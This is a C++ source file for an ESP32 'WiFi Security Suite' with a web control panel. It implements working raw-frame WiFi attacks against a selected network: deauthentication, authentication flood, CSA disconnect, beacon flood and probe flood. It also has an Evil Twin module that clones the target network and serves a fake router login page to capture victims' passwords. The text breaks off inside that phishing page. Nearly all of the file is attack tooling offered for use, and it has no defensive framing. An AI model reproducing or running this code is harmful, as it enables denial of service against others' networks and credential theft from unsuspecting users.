/*
 * ============================================================
 *  ESP32 WiFi Security Suite V2.1 (Aggressive Core)
 *  Complete Logic Rewrite for Maximum Effectiveness
 * ============================================================
 *  WIRING:
 *  MFRC522 RFID:
 *    SDA  -> GPIO 5
 *    SCK  -> GPIO 18
 *    MOSI -> GPIO 23
 *    MISO -> GPIO 19
 *    RST  -> GPIO 22
 *    3.3V -> 3.3V
 *    GND  -> GND
 *
 *  Buzzer:
 *    +    -> GPIO 4
 *    -    -> GND
 *
 *  Management AP:
 *    SSID     : Management AP
 *    Password : admin123
 *    IP       : 192.168.4.1
 * ============================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <MFRC522.h>
#include <esp_wifi.h>

// ─────────────────────────────────────────
//  PIN DEFINITIONS
// ─────────────────────────────────────────
#define SS_PIN     5
#define RST_PIN    22
#define BUZZER_PIN 4

// ─────────────────────────────────────────
//  RFID
// ─────────────────────────────────────────
MFRC522 mfrc522(SS_PIN, RST_PIN);

// Configured UID
byte authorizedUID[] = {0x8B, 0x8E, 0x4E, 0x43};
bool attackEnabled   = false;
unsigned long lastCardCheck = 0;

// ─────────────────────────────────────────
//  ACCESS POINT CONFIG
// ─────────────────────────────────────────
const char* AP_SSID = "Management AP";
const char* AP_PASS = "admin123";

// ─────────────────────────────────────────
//  GLOBAL STATE
// ─────────────────────────────────────────
WebServer server(80);
DNSServer  dnsServer;

String  targetSSID   = "";
uint8_t targetMAC[6] = {0};
bool    targetSet    = false;
uint8_t targetChannel = 1;
uint8_t apChannel     = 1;
int     attackDuration = 0;
uint8_t currentAttackType = 1;
unsigned long attackEndTime = 0;
bool    attacking    = false;
String  capturedPassword = "";
bool    evilTwinActive = false;

volatile unsigned long packetsSent = 0;

// ─────────────────────────────────────────
//  WEB UI (stored in flash)
// ─────────────────────────────────────────
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ESP32 Security Dashboard</title>
  <style>
    /* Light & Professional Theme */
    :root {
      --primary: #2563eb;
      --primary-hover: #1d4ed8;
      --danger: #dc2626;
      --danger-hover: #b91c1c;
      --success: #16a34a;
      --warning: #d97706;
      --bg-color: #f8fafc;
      --card-bg: #ffffff;
      --text-main: #1e293b;
      --text-muted: #64748b;
      --border: #e2e8f0;
      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
      --radius: 12px;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg-color); color: var(--text-main); padding: 2rem 1rem; line-height: 1.5; }
    .container { max-width: 800px; margin: 0 auto; }
    .header { text-align: center; margin-bottom: 2rem; }
    h1 { color: var(--primary); font-size: 2rem; font-weight: 700; margin-bottom: 0.5rem; letter-spacing: -0.025em; }
    .sub { color: var(--text-muted); font-size: 1rem; }
    
    .card { background: var(--card-bg); border-radius: var(--radius); padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: var(--shadow); border: 1px solid var(--border); transition: transform 0.2s ease; }
    .card h3 { color: var(--text-main); font-size: 1.1rem; font-weight: 600; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; border-bottom: 2px solid var(--bg-color); padding-bottom: 0.75rem; }
    
    .status-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; }
    .status-item { background: var(--bg-color); padding: 1rem; border-radius: 8px; border: 1px solid var(--border); }
    .status-label { color: var(--text-muted); font-size: 0.8rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.5rem; display: block; }
    .status-value { font-size: 1.125rem; font-weight: 600; color: var(--text-main); display: flex; align-items: center; justify-content: space-between;}
    
    .badge { padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.875rem; font-weight: 600; display: inline-flex; align-items: center; gap: 0.375rem; }
    .badge.on { background: #dcfce7; color: #166534; }
    .badge.off { background: #fee2e2; color: #991b1b; }
    .badge.warn { background: #fef9c3; color: #854d0e; }
    .badge.idle { background: #f1f5f9; color: #475569; }
    
    button { border: none; border-radius: 8px; padding: 0.75rem 1.5rem; font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; }
    button:active { transform: scale(0.98); }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .btn-primary { background: var(--primary); color: white; }
    .btn-primary:hover:not(:disabled) { background: var(--primary-hover); box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); }
    .btn-danger { background: var(--danger); color: white; }
    .btn-danger:hover:not(:disabled) { background: var(--danger-hover); box-shadow: 0 4px 12px rgba(220, 38, 38, 0.2); }
    .btn-secondary { background: #cbd5e1; color: #334155; }
    .btn-secondary:hover:not(:disabled) { background: #94a3b8; }
    .btn-outline { background: transparent; border: 2px solid var(--primary); color: var(--primary); }
    .btn-outline:hover:not(:disabled) { background: var(--primary); color: white; }
    
    .controls-group { display: flex; flex-wrap: wrap; gap: 1rem; align-items: flex-start; margin-bottom: 1rem; }
    .input-group { display: flex; flex-direction: column; gap: 0.5rem; flex: 1; min-width: 150px; position: relative; }
    .input-group label { font-size: 0.875rem; font-weight: 600; color: var(--text-main); }
    input[type=number] { background: white; border: 1px solid var(--border); color: var(--text-main); padding: 0.75rem; border-radius: 8px; font-size: 1rem; outline: none; transition: border-color 0.2s; font-family: inherit; }
    input[type=number]:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
    
    .custom-select { position: relative; width: 100%; user-select: none; }
    .select-selected { background: white; border: 1px solid var(--border); padding: 0.75rem; border-radius: 8px; cursor: pointer; color: var(--text-main); display: flex; justify-content: space-between; align-items: center; }
    .select-items { position: absolute; background: white; border: 1px solid var(--border); border-radius: 8px; box-shadow: var(--shadow); top: 100%; left: 0; right: 0; z-index: 99; margin-top: 4px; overflow: hidden; }
    .select-items div { padding: 0.75rem; cursor: pointer; border-bottom: 1px solid var(--bg-color); color: var(--text-main); }
    .select-items div:hover { background: #eff6ff; color: var(--primary); }
    .select-hide { display: none; }
    
    #networkList { margin-top: 1.5rem; display: flex; flex-direction: column; gap: 0.75rem; }
    .net-item { background: white; border: 1px solid var(--border); border-radius: 8px; padding: 1rem; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
    .net-item:hover { border-color: var(--primary); background: #f8fafc; }
    .net-item.selected { border-color: var(--primary); background: #eff6ff; box-shadow: inset 3px 0 0 var(--primary); }
    .net-info { display: flex; flex-direction: column; gap: 0.25rem; }
    .net-info .ssid { font-weight: 600; font-size: 1.05rem; color: var(--text-main); }
    .net-info .meta { color: var(--text-muted); font-size: 0.85rem; display: flex; gap: 0.75rem; align-items: center; }
    .signal-bars { display: flex; gap: 2px; height: 12px; align-items: flex-end; }
    .bar { width: 3px; background: #cbd5e1; border-radius: 1px; }
    .bar.active { background: var(--success); }
    
    .action-bar { display: flex; gap: 1rem; margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border); }
    .hint-box { background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 1rem; font-size: 0.9rem; color: #1e3a8a; display: flex; align-items: flex-start; gap: 0.75rem; margin-top: 1.5rem; }
    .hint-icon { font-size: 1.25rem; }
    
    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    .attacking .badge.warn { animation: pulse 1.5s infinite; }
    
    .limitations-card { background: #fffbeb; border: 1px solid #fcd34d; }
    .limitations-card h3 { color: #b45309; border-bottom-color: #fef3c7; }
    .limitations-card p { color: #92400e; font-size: 0.9rem; margin-bottom: 0.75rem; }
    .limitations-card strong { color: #78350f; }

    @media (max-width: 600px) {
      .action-bar { flex-direction: column; }
      button { width: 100%; }
      .net-item { flex-direction: column; align-items: flex-start; gap: 1rem; }
      .net-item button { align-self: flex-end; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>ESP32 Security Suite</h1>
      <p class="sub">Aggressive Operation Dashboard (V2.1)</p>
    </div>

    <!-- Warnings / Limitations -->
    <div class="card limitations-card">
      <h3>⚠️ Technical Limitations (Why attacks may fail)</h3>
      <p><strong>1. Phone Hotspots & Laptops:</strong> Phone hotspots often use the 5GHz band or WPA3 (Protected Management Frames). The ESP32 hardware is strictly 2.4GHz and <strong>cannot</strong> attack 5GHz or PMF networks.</p>
      <p><strong>2. Laptop Defenses:</strong> Modern laptops (Windows/Mac) often ignore CSA attacks. If a target ignores CSA, try the <strong>Auth Flood</strong> to crash the router instead.</p>
    </div>

    <!-- Status Overview -->
    <div class="card">
      <h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> System Overview</h3>
      <div class="status-grid" id="systemStatus">
        <div class="status-item">
          <span class="status-label">Access Control</span>
          <div class="status-value">
            <span id="authBadge" class="badge off">🔒 Locked</span>
          </div>
        </div>
        <div class="status-item">
          <span class="status-label">Operation Mode</span>
          <div class="status-value">
            <span id="atkBadge" class="badge idle">Idle</span>
          </div>
        </div>
        <div class="status-item">
          <span class="status-label">Active Target</span>
          <div class="status-value" style="font-size: 0.95rem; font-weight: 500;" id="targetLabel">
            None Selected
          </div>
        </div>
        <div class="status-item">
          <span class="status-label">Packets Sent (TX)</span>
          <div class="status-value" style="color: var(--danger);" id="txCount">0</div>
        </div>
        <div class="status-item" style="grid-column: 1 / -1; background: #fffbeb; border-color: #fde68a;">
          <span class="status-label" style="color: #b45309;">Evil Twin Captured Data</span>
          <div class="status-value" style="color: #92400e; font-family: monospace;" id="capturedData">Waiting for victim...</div>
        </div>
      </div>
    </div>

    <!-- Network Scanner -->
    <div class="card">
      <h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg> Environment Scanner (2.4GHz Only)</h3>
      <button class="btn-primary" onclick="scanNetworks()" id="scanBtn">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
        Discover Networks
      </button>
      <div id="networkList">
        <div style="text-align: center; color: var(--text-muted); padding: 2rem 0;">
          Click "Discover Networks" to find targets in range.
        </div>
      </div>
    </div>

    <!-- Attack Configuration -->
    <div class="card" id="attackCard">
      <h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"></path><polyline points="14 2 14 8 20 8"></polyline></svg> Attack Vectors</h3>
      
      <div class="controls-group">
        <div class="input-group">
          <label>Payload Strategy</label>
          <div class="custom-select" onclick="toggleDropdown(event)">
            <div class="select-selected" id="atkSelected">CSA Disconnect (Forces Channel Hop) ▼</div>
            <div class="select-items select-hide" id="atkOptions">
              <div onclick="selectAttack(0, 'Auth Flood (Overwhelms Router RAM)')">Auth Flood (Overwhelms Router RAM)</div>
              <div onclick="selectAttack(1, 'CSA Disconnect (Forces Channel Hop)')">CSA Disconnect (Forces Channel Hop)</div>
              <div onclick="selectAttack(2, 'Legacy Deauth (0xC0 - Broadcast)')">Legacy Deauth (0xC0 - Broadcast)</div>
              <div onclick="selectAttack(3, 'Beacon Flood (Generates Fake Networks)')">Beacon Flood (Generates Fake Networks)</div>
              <div onclick="selectAttack(4, 'Probe Flood (Spams Routers)')">Probe Flood (Spams Routers)</div>
            </div>
          </div>
          <input type="hidden" id="attackType" value="1">
        </div>
        <div class="input-group" style="flex:0.5;">
          <label for="duration">Duration (Sec)</label>
          <input type="number" id="duration" value="30" min="5" max="300">
        </div>
        
        <div class="input-group" style="flex: 100%; background: #fef2f2; padding: 1rem; border-radius: 8px; border: 1px solid #fecaca; margin-top: 0.5rem;">
          <small style="color:#991b1b; font-size:0.85rem; line-height: 1.5;">
            <strong>⚡ Maximum Power Mode:</strong> The ESP32 locks its radio onto the target channel with 100% duty cycle. The Web UI will freeze during the attack. <strong>Tap your RFID card to instantly abort</strong> and restore control. The attack also auto-stops when the timer expires.
          </small>
        </div>
      </div>
      
      <div class="action-bar">
        <button id="atkBtn" class="btn-primary" onclick="startAttack()" disabled>Engage Attack</button>
        <button id="stopBtn" class="btn-danger" onclick="stopAttack()" disabled>Abort</button>
      </div>
      
      <!-- EVIL TWIN SECTION -->
      <div style="margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border);">
        <h4 style="margin-top: 0; color: #b45309;">Evil Twin Module</h4>
        <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1rem;">
          Clone the target network to capture credentials via Captive Portal. 
          <strong style="color: #dc2626;">WARNING:</strong> The ESP32 only has 1 WiFi radio. Starting this will shut down the Management AP and disconnect you. You must reconnect to the cloned AP to see results.
        </p>
        <div style="display: flex; gap: 1rem;">
          <button id="etStartBtn" class="btn-primary" style="background: #ea580c;" onclick="startEvilTwin()" disabled>Deploy Evil Twin</button>
          <button id="etStopBtn" class="btn-outline" onclick="stopEvilTwin()" disabled>Stop Evil Twin</button>
        </div>
      </div>
      
      <div class="hint-box" id="hintBox">
        <span class="hint-icon">🔒</span>
        <div>
          <strong>Access Required:</strong> Please authenticate by tapping your registered RFID card on the reader hardware to unlock operation controls.
        </div>
      </div>
    </div>
  </div>

  <script>
    let selectedBSSID = '';
    let selectedSSID  = '';
    let selectedCh    = 1;
    let isAttacking = false;
    let isArmed = false;

    function getSignalBars(rssi) {
      let strength = 0;
      if (rssi >= -60) strength = 4;
      else if (rssi >= -70) strength = 3;
      else if (rssi >= -80) strength = 2;
      else if (rssi >= -90) strength = 1;
      
      let barsHtml = '<div class="signal-bars" title="' + rssi + ' dBm">';
      for(let i=1; i<=4; i++) {
        barsHtml += `<div class="bar ${i <= strength ? 'active' : ''}" style="height: ${i*3}px"></div>`;
      }
      barsHtml += '</div>';
      return barsHtml;
    }

    function updateStatus() {
      fetch('/status').then(r => r.json()).then(d => {
        isArmed = d.armed;
        isAttacking = d.attacking;
        
        document.getElementById('txCount').textContent = d.packetsSent;
        if(d.captured !== "") {
            document.getElementById('capturedData').innerHTML = `<strong>${d.captured}</strong>`;
        } else {
            document.getElementById('capturedData').textContent = "Waiting for victim...";
        }
        
        const etActive = d.etActive;
        document.getElementById('etStartBtn').disabled = !isArmed || selectedBSSID === '' || etActive;
        document.getElementById('etStopBtn').disabled = !etActive;

        const authBadge = document.getElementById('authBadge');
        if(isArmed) {
          authBadge.innerHTML = '✅ Authorized';
          authBadge.className = 'badge on';
        } else {
          authBadge.innerHTML = '🔒 Locked';
          authBadge.className = 'badge off';
        }

        const atkBadge = document.getElementById('atkBadge');
        const systemStatus = document.getElementById('systemStatus');
        if(isAttacking) {
          atkBadge.innerHTML = '⚡ ENGAGED';
          atkBadge.className = 'badge warn';
          systemStatus.parentElement.classList.add('attacking');
        } else {
          atkBadge.innerHTML = 'Standby';
          atkBadge.className = 'badge idle';
          systemStatus.parentElement.classList.remove('attacking');
        }

        const attackType = document.getElementById('attackType').value;
        const needsTarget = (attackType <= 2);
        const canAttack = isArmed && (!needsTarget || selectedBSSID !== '') && !isAttacking;
        
        document.getElementById('atkBtn').disabled = !canAttack;
        document.getElementById('stopBtn').disabled = !isAttacking;

        const hint = document.getElementById('hintBox');
        if (!isArmed) {
          hint.innerHTML = '<span class="hint-icon">🔒</span><div><strong>Access Required:</strong> Tap your RFID card on the reader to unlock attack controls.</div>';
          hint.style.backgroundColor = '#fef2f2'; hint.style.borderColor = '#fecaca'; hint.style.color = '#991b1b';
        } else if (isAttacking) {
          hint.innerHTML = '<span class="hint-icon">⚠️</span><div><strong>Operation Active:</strong> If Maximum Power mode is on, UI will freeze. <strong>Tap RFID card to abort.</strong></div>';
          hint.style.backgroundColor = '#fffbeb'; hint.style.borderColor = '#fde68a'; hint.style.color = '#92400e';
        } else if (needsTarget && selectedBSSID === '') {
          hint.innerHTML = '<span class="hint-icon">🎯</span><div><strong>Target Required:</strong> Select a network from the scanner above.</div>';
          hint.style.backgroundColor = '#eff6ff'; hint.style.borderColor = '#bfdbfe'; hint.style.color = '#1e3a8a';
        } else {
          hint.innerHTML = '<span class="hint-icon">✅</span><div><strong>System Ready:</strong> Parameters configured. Ready to execute.</div>';
          hint.style.backgroundColor = '#f0fdf4'; hint.style.borderColor = '#bbf7d0'; hint.style.color = '#166534';
        }
      }).catch(() => {});
    }

    function toggleDropdown(e) {
      document.getElementById('atkOptions').classList.toggle('select-hide');
      e.stopPropagation();
    }
    function selectAttack(val, name) {
      document.getElementById('attackType').value = val;
      document.getElementById('atkSelected').innerHTML = name + ' ▼';
      updateStatus();
    }
    document.addEventListener('click', function() {
      document.getElementById('atkOptions').classList.add('select-hide');
    });

    function scanNetworks() {
      const btn = document.getElementById('scanBtn');
      btn.disabled = true;
      btn.innerHTML = 'Scanning (Takes ~3s)...';
      document.getElementById('networkList').innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 2rem 0;">Scanning RF environment...</div>';

      fetch('/scan').then(r => r.json()).then(networks => {
        btn.disabled = false;
        btn.innerHTML = 'Discover Networks';
        
        if (networks.length === 0) {
          document.getElementById('networkList').innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 2rem 0;">No 2.4GHz networks found in range.</div>';
          return;
        }
        networks.sort((a,b) => b.rssi - a.rssi);
        let html = '';
        networks.forEach(n => {
          const isSelected = n.bssid === selectedBSSID;
          const displaySSID = n.ssid || '(Hidden Network)';
          html += `<div class="net-item ${isSelected ? 'selected' : ''}" onclick="selectTarget('${displaySSID}','${n.bssid}', ${n.ch}, this)">
            <div class="net-info">
              <div class="ssid">${displaySSID}</div>
              <div class="meta">
                <span>MAC: ${n.bssid}</span><span>•</span><span>CH: ${n.ch}</span><span>•</span>
                ${getSignalBars(n.rssi)}<span>${n.rssi} dBm</span>
              </div>
            </div>
            <button class="btn-outline" onclick="event.stopPropagation(); selectTarget('${displaySSID}','${n.bssid}', ${n.ch}, this.parentElement)">Select</button>
          </div>`;
        });
        document.getElementById('networkList').innerHTML = html;
      }).catch(() => {
        btn.disabled = false;
        btn.innerHTML = 'Discover Networks';
      });
    }

    function selectTarget(ssid, bssid, ch, element) {
      selectedSSID  = ssid; selectedBSSID = bssid; selectedCh    = ch;
      let displaySSID = ssid.length > 20 ? ssid.substring(0, 17) + '...' : ssid;
      document.getElementById('targetLabel').innerHTML = `<strong>${displaySSID}</strong> <span style="color:var(--text-muted); font-size:0.85em; display:block;">${bssid} (CH: ${ch})</span>`;
      
      fetch('/select?ssid=' + encodeURIComponent(ssid) + '&bssid=' + bssid + '&ch=' + ch);
      
      document.querySelectorAll('.net-item').forEach(el => {
        el.classList.remove('selected');
        el.querySelector('button').textContent = 'Select';
      });
      if(element) {
        element.classList.add('selected');
        element.querySelector('button').textContent = 'Selected';
      }
      updateStatus();
    }

    function startAttack() {
      const dur = document.getElementById('duration').value;
      const type = document.getElementById('attackType').value;
      
      fetch('/attack?duration=' + dur + '&type=' + type).then(() => {
        updateStatus();
      });
    }

    function stopAttack() {
      fetch('/stop').then(() => updateStatus());
    }
    
    function startEvilTwin() {
      const dur = document.getElementById('duration').value || 300;
      fetch('/eviltwin?state=1&duration=' + dur).then(() => updateStatus());
    }
    function stopEvilTwin() {
      fetch('/eviltwin?state=0').then(() => updateStatus());
    }

    setInterval(updateStatus, 1000);
    updateStatus();
  </script>
</body>
</html>
)rawliteral";


// ─────────────────────────────────────────
//  BUZZER HELPER
// ─────────────────────────────────────────
void beep(int freq, int durationMs, int count = 1) {
    for (int i = 0; i < count; i++) {
        unsigned long start = millis();
        unsigned long halfPeriod = 1000000 / freq / 2;
        while (millis() - start < durationMs) {
            digitalWrite(BUZZER_PIN, HIGH);
            delayMicroseconds(halfPeriod);
            digitalWrite(BUZZER_PIN, LOW);
            delayMicroseconds(halfPeriod);
        }
        if (count > 1) delay(100);
    }
}

// ─────────────────────────────────────────
//  RFID FUNCTIONS
// ─────────────────────────────────────────
bool cardWasPresent = false;
void checkRFID() {
    if (millis() - lastCardCheck < 50) return;
    lastCardCheck = millis();

    bool present = mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial();

    if (present) {
        if (!cardWasPresent) {
            cardWasPresent = true;
            bool match = true;
            if (mfrc522.uid.size != sizeof(authorizedUID)) match = false;
            else {
                for (byte i = 0; i < mfrc522.uid.size; i++) {
                    if (mfrc522.uid.uidByte[i] != authorizedUID[i]) { match = false; break; }
                }
            }

            if (match) {
                if (attacking || evilTwinActive) {
                    attacking = false;
                    if (evilTwinActive) {
                        evilTwinActive = false;
                        WiFi.softAP(AP_SSID, AP_PASS, apChannel);
                    }
                    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
                    beep(800, 400, 2);
                    Serial.println("✓ Emergency Stop!");
                } else {
                    attackEnabled = !attackEnabled;
                    if (attackEnabled) { beep(1200, 150, 2); Serial.println("✓ Unlocked"); }
                    else { beep(800, 400, 1); Serial.println("✓ Locked"); }
                }
            } else {
                beep(400, 600, 1);
                attackEnabled = false;
            }
        }
        mfrc522.PICC_HaltA();
    } else {
        cardWasPresent = false;
    }
}


// ─────────────────────────────────────────
//  ATTACK PACKETS
// ─────────────────────────────────────────

String fakeSSIDs[20];
uint8_t fakeMACs[20][6];

void initFakeNetworks() {
    for(int i=0; i<20; i++) {
        char randomSSID[12];
        for(int j=0; j<8; j++) randomSSID[j] = 'A' + random(26);
        randomSSID[8] = '\0';
        fakeSSIDs[i] = String(randomSSID);
        for(int m=0; m<6; m++) fakeMACs[i][m] = random(256);
        fakeMACs[i][0] &= 0xFE; 
        fakeMACs[i][0] |= 0x02; 
    }
}

// 0: Auth Flood
void sendAuthFloodPacket() {
    uint8_t pkt[30] = {
        0xB0, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
    };
    memcpy(&pkt[4], targetMAC, 6);
    memcpy(&pkt[16], targetMAC, 6);
    for(int i=0; i<6; i++) pkt[10+i] = random(256);
    pkt[10] &= 0xFE; pkt[10] |= 0x02;
    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false) == ESP_OK) packetsSent++;
}

// 1: CSA Disconnect
void sendCSA_Beacon(uint8_t channel) {
    uint8_t beacon[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x11, 0x04
    };
    memcpy(&beacon[10], targetMAC, 6);
    memcpy(&beacon[16], targetMAC, 6);
    uint16_t seq = random(4096) << 4;
    beacon[22] = seq & 0xFF; beacon[23] = (seq >> 8) & 0xFF;
    int pos = 36;
    beacon[pos++] = 0x00;
    int ssidLen = targetSSID.length();
    if (ssidLen > 32) ssidLen = 32;
    beacon[pos++] = ssidLen;
    for(int i=0; i<ssidLen; i++) beacon[pos++] = targetSSID[i];
    beacon[pos++] = 0x01; beacon[pos++] = 0x08;
    beacon[pos++] = 0x82; beacon[pos++] = 0x84; beacon[pos++] = 0x8b; beacon[pos++] = 0x96;
    beacon[pos++] = 0x24; beacon[pos++] = 0x30; beacon[pos++] = 0x48; beacon[pos++] = 0x6c;
    beacon[pos++] = 0x03; beacon[pos++] = 0x01; beacon[pos++] = channel;
    beacon[pos++] = 0x25; beacon[pos++] = 0x03; beacon[pos++] = 0x01;
    beacon[pos++] = (channel == 1) ? 6 : 1;
    beacon[pos++] = 0x00;
    if (esp_wifi_80211_tx(WIFI_IF_STA, beacon, pos, false) == ESP_OK) packetsSent++;
}

// 2: Legacy Deauth
void sendDeauthPacket() {
    uint8_t pkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
        0x00, 0x00, 0x01, 0x00              // Reason (1)
    };
    memcpy(&pkt[10], targetMAC, 6);
    memcpy(&pkt[16], targetMAC, 6);
    
    uint16_t seq = random(4096) << 4;
    pkt[22] = seq & 0xFF; pkt[23] = (seq >> 8) & 0xFF;
    
    // Reason 1 (Unspecified)
    pkt[24] = 0x01;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    
    // Reason 4 (Disassociated)
    pkt[24] = 0x04;
    pkt[22] = (seq + 16) & 0xFF; pkt[23] = ((seq + 16) >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    
    // Reason 8 (Leaving BSS)
    pkt[24] = 0x08;
    pkt[22] = (seq + 32) & 0xFF; pkt[23] = ((seq + 32) >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    
    packetsSent += 3;
}

// 3: Beacon Flood
void sendBeaconPacket(uint8_t floodChannel) {
    static int netIdx = 0;
    netIdx = (netIdx + 1) % 20;

    uint8_t beaconPacket[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x01, 0x04
    };
    
    memcpy(&beaconPacket[10], fakeMACs[netIdx], 6);
    memcpy(&beaconPacket[16], fakeMACs[netIdx], 6);

    int pos = 36;
    beaconPacket[pos++] = 0x00;
    int ssidLen = fakeSSIDs[netIdx].length();
    beaconPacket[pos++] = ssidLen;
    for(int i=0; i<ssidLen; i++) beaconPacket[pos++] = fakeSSIDs[netIdx][i];
    
    beaconPacket[pos++] = 0x01; beaconPacket[pos++] = 0x08;
    beaconPacket[pos++] = 0x82; beaconPacket[pos++] = 0x84; beaconPacket[pos++] = 0x8b; beaconPacket[pos++] = 0x96;
    beaconPacket[pos++] = 0x24; beaconPacket[pos++] = 0x30; beaconPacket[pos++] = 0x48; beaconPacket[pos++] = 0x6c;
    
    beaconPacket[pos++] = 0x03; beaconPacket[pos++] = 0x01; beaconPacket[pos++] = floodChannel;

    if (esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, pos, false) == ESP_OK) packetsSent++;
}

// 4: Probe Flood
void sendProbeRequestPacket() {
    uint8_t probePacket[128] = {
        0x40, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00
    };
    
    for(int i=0; i<6; i++) probePacket[10+i] = random(256);
    probePacket[10] &= 0xFE; probePacket[10] |= 0x02;

    if (esp_wifi_80211_tx(WIFI_IF_STA, probePacket, 26, false) == ESP_OK) packetsSent++;
}

// ─────────────────────────────────────────
//  WEB SERVER ROUTES
// ─────────────────────────────────────────

// HTML for the Fake Router Login (Ultra Professional)
const char* FAKE_LOGIN_HTML PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>Router Configuration</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: white; width: 100%; max-width: 380px; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; margin: 1rem; }
        .logo { width: 64px; height: 64px; background: #0066cc; border-radius: 50%; display: inline-flex; justify-content: center; align-items: center; margin-bottom: 1rem; }
        .logo svg { stroke: white; width: 32px; height: 32px; }
        h2 { color: #1c1e21; font-size: 1.25rem; margin: 0 0 0.5rem 0; font-weight: 600; }
        p { color: #606770; font-size: 0.95rem; margin: 0 0 1.5rem 0; line-height: 1.4; }
        input[type="password"] { width: 100%; box-sizing: border-box; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 1rem; margin-bottom: 1rem; background: #f5f6f7; outline: none; transition: border-color 0.2s; }
        input[type="password"]:focus { border-color: #0066cc; background: white; box-shadow: 0 0 0 2px rgba(0,102,204,0.2); }
        button { background: #0066cc; color: white; border: none; width: 100%; padding: 12px; font-size: 1rem; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background 0.2s; }
